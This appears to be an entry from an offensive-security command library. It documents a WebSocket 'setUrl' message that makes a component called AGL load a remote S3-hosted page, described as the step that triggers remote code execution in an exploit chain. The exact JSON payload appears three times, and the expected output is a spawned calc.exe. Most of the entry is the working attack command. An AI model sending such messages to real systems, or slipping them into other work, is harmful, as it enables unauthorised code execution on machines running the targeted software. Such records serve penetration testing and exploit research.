---
data: >-
  {"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}
tags:
  - websocket
  - rce
type: command
executor: json
platforms:
  - Windows
id: 131b9344-e8c0-4ac9-a37f-e984f5ec5b51
created_at: '2025-12-11T03:47:56.452Z'
updated_at: '2025-12-11T03:47:56.452Z'
verified: false
validated: true
submitted: true
---
# websocket-seturl-malicious

## Command

```json
{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}
```

## Description

WebSocket command to load a malicious URL in AGL, triggering RCE in the full chain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `command` | setUrl | Yes |
| `params.url` | Malicious URL | Yes |
| `source` | QAS | Yes |
| `target` | AGL | Yes |

## Examples

### Basic Usage

```json
{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}
```

## Expected Output

AGL loads the URL and executes the embedded JavaScript, spawning calc.exe.

## Related

- [[procedures/Chain-Vulnerabilities-for-Full-RCE]]
